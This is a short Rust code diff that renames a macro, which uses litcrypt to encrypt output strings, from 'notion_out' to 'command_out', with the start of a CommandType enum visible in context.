@@ -34,7 +34,7 @@ mod ls;
 
 /// Uses litcrypt to encrypt output strings
 /// and create `Ok(String)` output
-macro_rules! notion_out {
+macro_rules! command_out {
     ($s:tt) => {{
         Ok(lc!($s))
     }};
@@ -48,7 +48,7 @@ macro_rules! notion_out {
     }}
     
 }
-pub(crate) use notion_out;
+pub(crate) use command_out;
 
 /// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
